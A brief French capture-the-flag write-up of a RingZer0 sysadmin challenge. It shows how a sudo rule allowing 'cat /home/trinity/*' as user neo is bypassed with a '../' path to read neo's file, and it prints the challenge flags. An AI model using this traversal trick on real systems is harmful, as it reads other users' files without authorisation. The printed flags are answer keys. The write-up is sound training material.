ssh trinity@challenges.ringzer0ctf.com -p 10090

Mot de passe: Flag-7e0cfcf090a2fe53c97ea3edd3883d0d


 ls -alt
total 24
drwxr-x--- 2 trinity trinity 4096 Apr 23  2022 .
lrwxrwxrwx 1 root    root       9 Apr 23  2022 .bash_history -> /dev/null
drwxr-xr-x 9 root    root    4096 Apr 23  2022 ..
-rwxr-x--- 1 trinity trinity  252 Apr 23  2022 .bash_logout
-rwxr-x--- 1 trinity trinity 2632 Apr 23  2022 .bashrc
-rwxr-x--- 1 trinity trinity  124 Apr 23  2022 phonebook
-rwxr-x--- 1 trinity trinity  674 Apr 23  2022 .profile

trinity@sysadmin-track:~$ cat phonebook 
The Oracle        1800-133-7133
Persephone        345-555-1244
copy made by Cypher copy utility on /home/neo/phonebook


Ah intéressant le dernier commentaire.


J'ai finalement run:
sudo -l pour lister ce que je peux run en tant qu'un autre


User trinity may run the following commands on sysadmin-track:
    (neo) /bin/cat /home/trinity/*

Mais c'est vraiment pas top de faire ça vu que ceci ne fonctionne pas:
cat /home/neo/phonebook 
cat: /home/neo/phonebook: Permission denied

MAIS je pourrai changer le path en faisant:
sudo -u neo /bin/cat /home/trinity/../neo/phonebook

FLAG-314df4d411ae37f16f590f65da99f3b6